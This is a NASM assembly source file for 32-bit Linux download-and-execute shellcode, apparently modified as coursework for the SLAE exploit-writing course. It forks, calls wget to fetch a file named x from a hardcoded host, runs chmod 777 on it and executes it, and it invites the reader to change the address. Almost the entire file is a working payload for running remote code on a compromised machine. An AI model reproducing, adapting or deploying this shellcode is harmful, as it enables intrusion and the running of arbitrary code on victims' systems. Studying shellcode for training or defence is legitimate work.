; Filename: downloadexec.nasm
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/
; Tested on: Ubuntu 12.04 / 32Bit
; License: http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode:
; - download 192.168.2.222/x with wget
; - chmod x
; - execute x
; - x is an executable
; - length 108 bytes

;
; Modified by Daniel Roberson SLAE-877
;

BITS 32

global _start

section .text

_start:

    ;fork
    sub eax, eax
    add eax, 2
    int 0x80
    sub ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    sub eax,eax
    add al, 7
    int 0x80
        
    ;chmod x
    sub ecx, ecx
    sub eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    sub ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    sub eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    ;mov al, 11
    add eax, 11
    int 0x80
    
child:
    ;download 192.168.2.222//x with wget
    push 0xb
    pop eax
    cdq
    push edx

    jmp url
one:
    pop esi
    mov ecx, esi

    push 0x74 ;t
    push 0x6567772f ;egw/
    push 0x6e69622f ;nib/
    push 0x7273752f ;rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80

url:
    call one
    db "192.168.10.10/x" ;; change this to whatever

